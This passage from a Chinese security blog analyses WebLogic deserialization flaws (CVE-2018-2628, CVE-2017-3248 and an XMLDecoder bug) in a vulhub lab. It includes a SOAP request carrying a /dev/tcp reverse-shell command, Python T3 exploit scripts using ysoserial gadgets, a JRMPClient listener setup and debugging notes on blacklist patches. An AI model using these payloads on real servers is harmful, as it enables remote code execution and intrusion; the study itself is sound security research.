<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10172#toc-4" >https://xz.aliyun.com/t/10172#toc-4</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>对应调用链条为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">WorkContextServerTube.processRequest   		</span><br><span class="line">WorkContextServerTube.readHeaderOld			//这里进行数据提取分割</span><br><span class="line">WorkContextTube.WorkContextXmlInputAdapter  //这里创建XMLDecoder对象</span><br><span class="line">WorkContextServerTube.receive</span><br><span class="line">WorkContextMapImpl.receiveRequest</span><br><span class="line">WorkContextLocalMap.receiveRequest</span><br><span class="line">WorkContextEntryImpl.readEntry</span><br><span class="line">WorkContextXmlInputAdapter.readUTF</span><br></pre></td></tr></table></div></figure>

<p>最终在<code>readUTF</code>中进行反序列化，</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230206192739611.png" alt="image-20230206192739611"></p>
<p>这里的<code>xmlDecode</code>里面保存的<code>buf</code>就是我们传入去掉头部留下的数据</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230206194257790.png" alt="image-20230206194257790"></p>
<p>赋值过来，用<code>python</code>跑一下就知道</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230206194334454.png" alt="image-20230206194334454"></p>
<p>这样即得到最终的命令执行。</p>

        <h3 id="POC"   >
          <a href="#POC" class="heading-link"><i class="fas fa-link"></i></a><a href="#POC" class="headerlink" title="POC"></a>POC</h3>
      <p>在<code>P神</code>的<code>vulhub</code>下复制来的</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 192.168.163.130:7001</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 641</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class="line">&lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java version=&quot;1.8.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;</span><br><span class="line">bash -i &amp;gt;&amp;amp; /dev/tcp/[IP]/[PORT] 0&amp;gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></div></figure>


        <h3 id="漏洞修复"   >
          <a href="#漏洞修复" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3>
      <p>官方补丁，没看怎么进行修复，不过应该时添加黑名单</p>

        <h2 id="CVE-2018-2628"   >
          <a href="#CVE-2018-2628" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h2>
      <p>详见上面的<code>T3</code>反序列化，是<code>T3</code>协议的漏洞</p>

        <h3 id="漏洞探测"   >
          <a href="#漏洞探测" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h3>
      <p>首先需要看<code>Weblogic</code>是否启用<code>T3</code>协议，以及版本号的判断</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 7001,7002 -T4 -A -v --script weblogic-t3-info 192.168.120.161</span><br></pre></td></tr></table></div></figure>


        <h3 id="环境搭建-1"   >
          <a href="#环境搭建-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3>
      <p>也是类似的，用<code>vulhub</code>的，参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10172#toc-1" >https://xz.aliyun.com/t/10172#toc-1</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>记得最后把<code>docker</code>重启一下就行</p>

        <h3 id="漏洞分析-1"   >
          <a href="#漏洞分析-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3>
      <p>先从最开始的<code>CVE-2015-4852</code>进行分析，参考:<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.yuque.com/tianxiadamutou/zcfd4v/aevpg0#CVE-2015-4852" >Weblogic学习（一）： 初识T3反序列化 (yuque.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>使用如下<code>exp</code></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> popen</span><br><span class="line"><span class="keyword">import</span> struct <span class="comment">#负责大小端的转换 </span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> stdout</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generatePayload</span>(<span class="params">gadget,cmd</span>):</span></span><br><span class="line">    YSO_PATH = <span class="string">&quot;/home/hacker/Desktop/WEB/JAVA/ysoserial.jar&quot;</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;-jar&#x27;</span>,YSO_PATH,gadget,cmd],stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">T3Exploit</span>(<span class="params">ip,port,payload</span>):</span></span><br><span class="line">    sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((ip,port))</span><br><span class="line">    handshake = <span class="string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span></span><br><span class="line">    sock.sendall(handshake.encode())</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">compile</span> = re.<span class="built_in">compile</span>(<span class="string">&quot;HELO:(.*).0.false&quot;</span>)</span><br><span class="line">    match = <span class="built_in">compile</span>.findall(data.decode())</span><br><span class="line">    <span class="keyword">if</span> match:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Weblogic: &quot;</span>+<span class="string">&quot;&quot;</span>.join(match))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Weblogic&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span>  </span><br><span class="line">    <span class="comment">#payload的长度四字节无符号整数</span></span><br><span class="line">    payloadLen = binascii.a2b_hex(<span class="string">b&quot;00000000&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#头部某些地方改掉也没关系，估计是只检测了一部分</span></span><br><span class="line">    t3header = binascii.a2b_hex(<span class="string">b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#反序列化标志，这个不能改</span></span><br><span class="line">    desflag = binascii.a2b_hex(<span class="string">b&quot;fe010000&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    payload = payloadLen + t3header  +desflag+  payload</span><br><span class="line">    payload = struct.pack(<span class="string">&quot;&gt;I&quot;</span>,<span class="built_in">len</span>(payload)) + payload[<span class="number">4</span>:]</span><br><span class="line">    sock.send(payload)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    gadget = <span class="string">&quot;CommonsCollections1&quot;</span></span><br><span class="line">    cmd = <span class="string">&quot;touch /tmp/o_success&quot;</span></span><br><span class="line">    payload = generatePayload(gadget,cmd)</span><br><span class="line">    T3Exploit(ip,port,payload)</span><br></pre></td></tr></table></div></figure>

<p>首先断点下在<code>weblogic.rjvm.InboundMsgAbbrev#readObject</code>。如下图所示，可以看到前面还有一堆的调用链条</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208153909798.png" alt="image-20230208153909798"></p>
<p>是相关的异步以及线程、复用器(<code>muxer</code>)的分发等知识，不是很懂这里，估计是一些监听检测之类的，可以看看如下的介绍</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8073#toc-2" >CVE-2018-2628 Weblogic反序列化漏洞分析 - 先知社区 (aliyun.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>然后看看现在的<code>weblogic.rjvm.InboundMsgAbbrev#readObject</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208160844802.png" alt="image-20230208160844802"></p>
<p>这个<code>var1</code>就是接收到的数据，看里面的<code>head</code>的<code>buf</code>属性，将其复制出来，用<code>python</code>打印一下看看</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208160956140.png" alt="image-20230208160956140"></p>
<p>可以看到这一大串，其实就是我们的<code>exp</code>中的原数据</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208161130659.png" alt="image-20230208161130659"></p>
<p>前面的<code>000005f2</code>就是总的数据包的长度，这些数据都是可控的，但是这个长度只能比实际<code>payload</code>短，不能长。</p>
<p>那么之后就是相关解析，进行反序列化了。</p>

        <h4 id="resolveClass"   >
          <a href="#resolveClass" class="heading-link"><i class="fas fa-link"></i></a><a href="#resolveClass" class="headerlink" title="resolveClass"></a>resolveClass</h4>
      <p>在上述的<code>readObject</code>之后还会进行一系列的函数调用，其中比较重要的点就是<code>weblogic.rjvm.InboundMsgAbbrev#resolveClass</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208163342951.png" alt="image-20230208163342951"></p>
<p>传入的<code>stream</code>会调用父类<code>ObjectInputStream</code>的<code>resolveClass</code>来进行类名解析</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208163240081.png" alt="image-20230208163240081"></p>
<p>对于总的<code>readObject</code>流程中，<code>weblogic.rjvm.InboundMsgAbbrev#resolveClass</code>大致扮演的角色如下廖师傅的图片</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/t0158bffbfdfc75d52f.png" alt="t0158bffbfdfc75d52f"></p>
<p>那么就可以在这里添加一个过滤条件，设置黑名单了，比如如下对于<code>12.2.1.3</code>版本的<code>Weblogic</code>就会有如下过滤，存在一个检查</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208163826701.png" alt="image-20230208163826701"></p>
<p>而从最开始的该<code>CVE</code>相关的<code>T3</code>反序列化爆出来之后，后续修复方案大多都是在调用父类<code>resolveClass</code>之前进行黑名单过滤，写的代码也是逐次迭代</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/ikRBb4e8gMP8DtlpQlpYng" >weblogic历史T3反序列化漏洞及补丁梳理</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>最开始针对<code>CVE-2015-4852</code>的修复是在<code>resolveClass</code>中引入了<code>ClassFilter.isBlackListed</code>进行过滤，盗用一下<code>cL0und</code>师傅的图，23333</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/640.png" alt="640"></p>
<p>后面缝缝补补，黑名单位置也更改在<code>WebLogicFilterConfig.class</code>中</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230207203932893.png" alt="image-20230207203932893"></p>
<p>所以在后续的漏洞中，由于黑名单的使用这里其实需要对<code>resolveClass</code>进行一个分析</p>

        <h4 id="CVE-2017-3248"   >
          <a href="#CVE-2017-3248" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h4>
      <p>对于该漏洞的相关的漏洞发展绕过，可以看<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/ikRBb4e8gMP8DtlpQlpYng" >weblogic历史T3反序列化漏洞及补丁梳理</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，比较和本次<code>CVE-2018-2628</code>漏洞相关的是<code>CVE-2017-3248</code>，首次出现使用<code>JRMPClient</code>进行外带<code>RCE</code></p>
<p>对应的<code>exp</code>如下</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">from os <span class="keyword">import</span> popen</span><br><span class="line"><span class="keyword">import</span> struct # 负责大小端的转换 </span><br><span class="line"><span class="function"><span class="keyword">import</span> subprocess</span></span><br><span class="line"><span class="function">from sys <span class="keyword">import</span> stdout</span></span><br><span class="line"><span class="function"><span class="keyword">import</span> socket</span></span><br><span class="line"><span class="function"><span class="keyword">import</span> re</span></span><br><span class="line"><span class="function"><span class="keyword">import</span> binascii</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">def <span class="title">generatePayload</span><span class="params">(gadget,cmd)</span>:</span></span><br><span class="line"><span class="function">    YSO_PATH </span>= <span class="string">&quot;/home/hacker/Desktop/WEB/JAVA/ysoserial.jar&quot;</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;-jar&#x27;</span>,YSO_PATH,gadget,cmd],stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">T3Exploit</span><span class="params">(ip,port,payload)</span>:</span></span><br><span class="line"><span class="function">    sock </span>=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((ip,port))</span><br><span class="line">    handshake = <span class="string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span></span><br><span class="line">    sock.sendall(handshake.encode())</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    compile = re.compile(<span class="string">&quot;HELO:(.*).0.false&quot;</span>)</span><br><span class="line">    match = compile.findall(data.decode())</span><br><span class="line">    <span class="keyword">if</span> match:</span><br><span class="line">        print(<span class="string">&quot;Weblogic: &quot;</span>+<span class="string">&quot;&quot;</span>.join(match))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;Not Weblogic&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span>  </span><br><span class="line">    #payload的长度四字节无符号整数</span><br><span class="line">    payloadLen = binascii.a2b_hex(b<span class="string">&quot;00000000&quot;</span>)</span><br><span class="line"></span><br><span class="line">    #头部某些地方改掉也没关系，估计是只检测了一部分</span><br><span class="line">    t3header = binascii.a2b_hex(b<span class="string">&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    #反序列化标志，这个不能改</span><br><span class="line">    desflag = binascii.a2b_hex(b<span class="string">&quot;fe010000&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload = payloadLen + t3header  +desflag+  payload</span><br><span class="line">    payload = struct.pack(<span class="string">&quot;&gt;I&quot;</span>,len(payload)) + payload[<span class="number">4</span>:]</span><br><span class="line">    sock.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    gadget = <span class="string">&quot;JRMPClient&quot;</span></span><br><span class="line">    command = <span class="string">&quot;[JRMPListern_IP]:[JRMPListern_Port]&quot;</span></span><br><span class="line">    payload = generatePayload(gadget, command)</span><br><span class="line">    T3Exploit(host, port, payload)</span><br></pre></td></tr></table></div></figure>

<p>可以看到发送的序列化对象是通过<code>ysoserial</code>生成的，我们看看<code>ysoserial</code>里面具体生成了什么对象</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208200426758.png" alt="image-20230208200426758"></p>
<p>可以看到生成的是<code>Registry</code>对象，然后将之复制出来，放到<code>IDEA</code>里面自己测试一下</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.test.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">myTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Registry <span class="title">getObject</span> <span class="params">()</span></span>&#123;</span><br><span class="line">        String host = <span class="string">&quot;JRMPLister_IP&quot;</span>;</span><br><span class="line">        <span class="keyword">int</span> port = JRMPLister_Port;</span><br><span class="line">        ObjID id = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(host, port);</span><br><span class="line">        UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">        RemoteObjectInvocationHandler obj = <span class="keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br><span class="line">        Registry proxy = (Registry) Proxy.newProxyInstance(</span><br><span class="line">            myTest.class.getClassLoader(),</span><br><span class="line">            <span class="keyword">new</span> Class[] &#123;Registry.class&#125;,</span><br><span class="line">            obj);</span><br><span class="line">        <span class="keyword">return</span> proxy;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> RemoteException, NotBoundException </span>&#123;</span><br><span class="line">        myTest test = <span class="keyword">new</span> myTest();</span><br><span class="line">        Registry testObj = test.getObject();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>在开启了远程的<code>JRMPLister_IP</code>之后</p>
<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ./ysoserial-all.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections6 &#x27;touch /tmp/zzzz&#x27;</span><br></pre></td></tr></table></div></figure>

<p>执行上述<code>JAVA</code>代码，发现并没有命令执行，远程也没有发送数据的信息显示。那么就可能现在还没有和远程进行通信，那么加入如下可以远程通信的代码</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">myTest test = <span class="keyword">new</span> myTest();</span><br><span class="line">Registry testObj = test.getObject();</span><br><span class="line">testObj.list();  <span class="comment">//列出可以远程调用的相关对象</span></span><br><span class="line">System.out.println(<span class="string">&quot;test&quot;</span>);</span><br></pre></td></tr></table></div></figure>

<p>发现成功命令执行。</p>
<p>但是这里有个疑问，在<code>Weblogic</code>中反序列化对象之后，我并没有找到有对对象调用了远程通信的方法，而在调试的时候发现，当从<code>resloveClass</code>中返回，即完成如下代码就会得到命令执行了，这里有点不太懂。为什么能够远程通信了，这些代码里面并没有找到和远程通信的方法调用呀。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208201323984.png" alt="image-20230208201323984"></p>

        <h5 id="实际调用链"   >
          <a href="#实际调用链" class="heading-link"><i class="fas fa-link"></i></a><a href="#实际调用链" class="headerlink" title="实际调用链"></a>实际调用链</h5>
      <p>参考:<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2650" >ysoserial JRMP相关模块分析（二）- payloads/JRMPClient &amp; exploit/JRMPListener - 先知社区 (aliyun.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://cert.360.cn/report/detail?id=add23f0eafd94923a1fa116a76dee0a1" >RMI Bypass Jep290(Jdk8u231) 反序列化漏洞分析 - 360CERT</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>实际调试一下，看看是怎么从<code>Registry</code>调用到和远程通信的函数，将<code>Weblogic</code>的<code>jdk</code>拿出来调试，上述的文章告诉我们最后是在<code>jdk1.6.0_45/jre/lib/rt.jar!/sun.rmi.transport.StreamRemoteCall#executeCall</code>中获取到远程对象进行反序列化的，如下图所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209153555302.png" alt="image-20230209153555302"></p>
<p>断点下在这里，看一看实际数据，这里的<code>in</code>就是连接的数据流</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209155129824.png" alt="image-20230209155129824"></p>
<p>断点之后再运行一下就断在如图所示地方，<code>ysoserial</code>会自动生成<code>BadAttributeValueExpException</code>这个类对象，然后将恶意的数据封装进去，所以实际的数据中，已经可以看到相关的<code>CC</code>链其实已经传过来并且反序列化了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209154129644.png" alt="image-20230209154129644"></p>
<p>看看对应的调用栈</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209155514492.png" alt="image-20230209155514492"></p>
<p>有点多，前面大部分都是<code>RMI</code>机制相关的调用，不用太管，主要看实际的反序列化的点，即<code>weblogic.rjvm.InboundMsgAbbrev#readObject</code>处，那么相关的调用栈就如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209155913075.png" alt="image-20230209155913075"></p>
<p>这里可以看到有一堆的<code>readObject</code>，这其实涉及到<code>ObjectInputStream</code>反序列化的几种方式，参考:<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/249654" >Weblogic CVE-2021-2394 反序列化漏洞分析-安全客 - 安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，引用一下上述的一张图，其中红色和蓝色路径是互斥的。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/t010c1b879c4be0fecb.png" alt="img"></p>
<p>那么前面就是针对接口<code>Registry</code>的以及<code>RemoteObjectInvocationHandler</code>的反序列化，而<code>RemoteObjectInvocationHandler</code>是继承自<code>RemoteObject</code>，<code>RemoteObject</code>又实现了<code>Serializable</code>接口，所以走的是下面蓝色的那条路径。</p>
